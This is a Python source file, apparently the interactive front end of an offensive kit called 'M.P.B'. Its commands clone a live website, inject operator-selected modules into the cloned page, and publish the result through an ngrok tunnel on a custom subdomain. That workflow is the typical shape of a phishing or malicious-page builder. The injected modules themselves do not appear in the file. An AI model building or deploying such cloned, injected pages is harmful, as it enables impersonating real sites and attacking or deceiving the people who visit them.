import os
import ctypes
import subprocess
import requests
from datetime import datetime
from pyngrok import ngrok
from time import sleep
from core import config
from core import basic
from core import page_builder
from core import cloner

config.init()

# User Interface
def menu():
	is_ngrok = False
	selected_modules = []
	selected_modules_names = []
	while True:
		if is_ngrok:
			ngrok.disconnect(config.ngrok_url)
		x = input(config.WHITE+'{'+config.RED+'M.P.B '+config.WHITE+'}: ')
		if x.lower() == 'list':
			print(config.CYAN+'\n\t--AVAILABLE MODULES--\t\n'+config.WHITE)
			c = 1
			for i in config.module_list:
				print(config.WHITE+str(c)+'. '+config.YELLOW+i.replace('html','')+'\t'+config.GREEN+config.module_desc_list[c-1]+'\n'+config.WHITE)
				c+=1
		elif x.lower() == 'list_selected':
			if len(selected_modules) != 0:
				c = 1
				print(config.CYAN+'\n\t--- Selected Modules---:\n '+config.WHITE)
				for i in selected_modules_names:
					print(config.WHITE+str(c)+'. '+config.YELLOW+i)
					c+=1
				print('\n')

			else:
				basic.print_status('No modules selected.')
		elif x.lower() == 'exit':
			exit()

		elif x.lower() == 'help':
			basic.usage()

		elif x.lower() == 'clear':
			basic.clear()
		elif 'include' in x.lower():
			if len(x.split(' ')) == 2:
				if x.split(' ')[1] in selected_modules_names:
					basic.print_err('Module is already present in the list.')
				else:
					if x.split(' ')[1] in config.module_list:
						c = 0
						for i in config.module_list:
							if i == x.split(' ')[1]:
								break
							else:
								c+=1
						basic.print_status('Adding '+config.YELLOW+x.split(' ')[1]+config.WHITE+' to build list.\n')
						selected_modules.append(config.module_filename_list[c])
						selected_modules_names.append(x.split(' ')[1])
						#selected_modules.append(x.split(' ')[1])
					else:
						basic.print_err('Invalid Module Selected')
			else:
				basic.print_err('Invalid syntax. Type "help".')

		elif 'exclude' in x.lower():
			if len(x.split(' ')) == 2:
				if x.split(' ')[1] in selected_modules_names:
					c = 0
					for i in selected_modules_names:
						for k in config.module_list:
							if i == k:
								break
							else:
								c+=1
						break
					selected_modules.remove(config.module_filename_list[c])
					selected_modules_names.remove(x.split(' ')[1])
					basic.print_status(config.YELLOW+x.split(' ')[1]+config.WHITE+' removed from list\n')
				else:
					basic.print_err('Specified module is not in the list.')
			else:
				basic.print_err('Invalid syntax. Type "help".')
		elif 'clone' in x.lower():
			if ' ' in x and len(x.split()) == 2:
				basic.print_status(f'checking site {x.split()[1]}...')
				if basic.is_connected():
					if 'https://' in x.split()[1] or 'http://' in x.split()[1]:
						try:
							if requests.get(x.split()[1]).status_code == 200:
								basic.print_status('SITE IS OK.')
								basic.print_status('Beginning cloning process.')
								cloner.Clone(x.split()[1])
								page_builder.Page_Builder(selected_modules).inject_in_cloned_page()
							else:
								print(1)
								basic.print_err('THIS WEBSITE CANNOT BE CLONED.')
						except Exception as e:
							print(2)
							print(e,e.args)
							basic.print_err('THIS WEBSITE CANNOT BE CLONED.')
					else:
						basic.print_err('NO PROTOCOL SPECIFIED IN URL')
				else:
					basic.print_err('NO INTERNET CONNECTION DETECTED')
			else:
				basic.print_err('Invalid Syntax')
		elif x.lower() == 'build':
			if len(selected_modules) != 0:
				if config.use_ngrok:
					config.ngrok_url = ngrok.connect(config.port,subdomain=config.subdomain).public_url
					is_ngrok = True
				page_builder.Page_Builder(selected_modules).build_page()
			else:
				basic.print_err('No module selected for building.')
		elif 'set' in x.lower() and len(x.split()) == 3:
			basic.set_cmd(x.split()[1], x.split()[2])
		elif x.lower() == 'options':
			print(f'\n{config.CYAN}--OPTION--\t--VALUE--{config.WHITE}\n')
			print(f'{config.YELLOW}use_ngrok\t{config.GREEN}{config.use_ngrok}{config.WHITE}\n{config.YELLOW}port\t\t{config.WHITE}{config.GREEN}{config.port}\n{config.WHITE}{config.YELLOW}subdomain\t{config.WHITE}{config.GREEN}{config.subdomain}\n{config.WHITE}')
		else:
			basic.print_err('Invalid command. Type "help" for a list of commands.')


try:
	# Checking if the platform is Windows, and if is then we call basic.win_color_config()
	if os.name == 'nt':
		basic.win_color_config()
	print(config.banner+'\n\n')
	basic.load_modules()
	menu()
except Exception as e:
	with open('error.txt','a') as f:
		f.write(datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+' : '+str(e)+'\n\n') # Logging errors
	basic.print_err(e)
	exit()
